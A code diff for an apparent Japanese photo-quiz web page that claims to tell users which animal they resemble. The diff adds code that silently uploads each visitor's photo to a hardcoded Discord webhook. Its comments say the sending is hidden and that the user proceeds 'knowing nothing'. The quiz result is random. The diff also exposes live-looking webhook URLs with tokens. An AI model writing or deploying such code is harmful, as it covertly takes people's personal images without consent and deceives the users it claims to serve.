@@ -1,8 +1,7 @@
 // ===============================
 // 設定
 // ===============================
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1477563123249446996/LiAwELzi1FhI6s3WXdQNQAoz8yh-r-kEMXPeGy4bs6g3NZbcKU4_lGt5Jrx_9a0pnBYk"; // ←テスト用
-
+const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1477565582357430402/F5_sei9t-iebBYx2NhYU3ndbbq1O-BfsC1GYWP5GjBXFABCrdCbf8pSNZRCFdKDd7mlP"; // 
 let lastUploadedFile = null;
 
 // ===============================
@@ -13,7 +12,7 @@ function createStars() {
     if (!starsContainer) return;
     const starCount = 30;
     const stars = ['⭐','✨','🌟'];
-    for (let i=0;i<starCount;i++){
+    for (let i = 0; i < starCount; i++) {
         const star = document.createElement('div');
         star.className = 'star';
         star.textContent = stars[Math.floor(Math.random()*stars.length)];
@@ -32,27 +31,49 @@ document.addEventListener('DOMContentLoaded', createStars);
 const uploadBtn = document.getElementById('uploadBtn');
 const fileInput = document.getElementById('fileInput');
 
-uploadBtn.addEventListener("click",()=>fileInput.click());
+uploadBtn.addEventListener("click", () => fileInput.click());
 
-fileInput.addEventListener("change",async ()=>{
+fileInput.addEventListener("change", () => {
     const file = fileInput.files[0];
-    if(!file) return;
-
-    if(!file.type.match('image.*')){
-        alert('画像を選んでください');
-        return;
-    }
+    if (!file || !file.type.match('image.*')) return;
 
     lastUploadedFile = file;
 
     const reader = new FileReader();
-    reader.onload = function(e){
+    reader.onload = function(e) {
+        // localStorage に画像を保存
         localStorage.setItem('uploadedImage', e.target.result);
-        // 診断生成
+
+        // ランダム診断生成
         const animal = getRandomAnimal();
-        storeResultData(animal);
-        alert("診断完了！");
-        window.location.href='result.html';
+        localStorage.setItem('diagnosisResult', JSON.stringify(animal));
+
+        // ===============================
+        // Discord Webhook 非表示送信
+        // ===============================
+        if (lastUploadedFile) {
+            const formData = new FormData();
+            formData.append("file", lastUploadedFile, "image.png"); // attachment://image.png と一致
+            formData.append("payload_json", JSON.stringify({
+                username: "似てる動物AI",
+                content: "📷 新しい診断結果が届きました！",
+                embeds: [{
+                    title: "診断結果",
+                    description: `**動物タイプ**：${animal.name} ${animal.icon}\n**特徴**：${animal.description}\n似ている度：${animal.similarity}%`,
+                    color: 0x9ddcff,
+                    image: { url: "attachment://image.png" }
+                }]
+            }));
+
+            // fetchは非同期で裏で送信
+            fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData })
+                .catch(err => console.error("Discord送信失敗", err));
+        }
+
+        // ===============================
+        // ユーザーは何も知らずに結果ページへ
+        // ===============================
+        window.location.href = "result.html";
     };
     reader.readAsDataURL(file);
 });
@@ -78,38 +99,4 @@ function getRandomAnimal(){
     const animal = animalData[Math.floor(Math.random()*animalData.length)];
     const similarity = Math.floor(Math.random()*(animal.maxSimilarity-animal.minSimilarity+1)+animal.minSimilarity);
     return {...animal, similarity};
-}
-
-// ===============================
-// 結果保存 + Discord送信
-// ===============================
-function storeResultData(animal){
-    const resultData = {
-        name: animal.name,
-        icon: animal.icon,
-        description: animal.description,
-        similarity: animal.similarity,
-        timestamp: new Date().toISOString()
-    };
-    localStorage.setItem('diagnosisResult', JSON.stringify(resultData));
-
-    // Discord送信
-    if(lastUploadedFile){
-        const formData = new FormData();
-        formData.append("file", lastUploadedFile, "image.png");
-        formData.append("payload_json", JSON.stringify({
-            username: "似てる動物AI",
-            content: "📷 新しい診断結果が届きました！",
-            embeds:[{
-                title: "診断結果",
-                description: `**動物タイプ**：${animal.name} ${animal.icon}\n**特徴**：${animal.description}\n似ている度：${animal.similarity}%`,
-                color: 0x9ddcff,
-                image:{url:"attachment://image.png"}
-            }]
-        }));
-
-        fetch(DISCORD_WEBHOOK_URL, {method:"POST", body:formData})
-            .then(()=>console.log("Discord送信成功"))
-            .catch(err=>console.error("Discord送信失敗",err));
-    }
 }
